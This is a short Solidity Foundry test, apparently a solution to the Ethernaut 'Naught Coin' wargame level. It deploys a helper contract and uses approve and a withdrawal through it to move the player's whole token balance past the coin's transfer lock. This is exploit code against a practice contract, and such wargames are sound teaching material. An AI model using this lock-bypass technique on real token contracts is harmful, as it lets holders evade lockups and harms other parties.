// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel15.sol";
import "../src/level15.sol";

contract Attacker is Test {
    NaughtCoin coin = NaughtCoin(0xb0B4E867120F5783CC07479112Be2ADF8763a956);
    address player = 0xE58EB5D607D62AdDf5F16e3750FB56adD6771917;

    function test() external {
        NaughtBank bank = new NaughtBank(coin);
        uint256 balance = coin.balanceOf(player);

        vm.startPrank(player);
        coin.approve(address(bank), balance);
        bank.withdraw(balance);

        assertEq(coin.balanceOf(player), 0);
    }
}
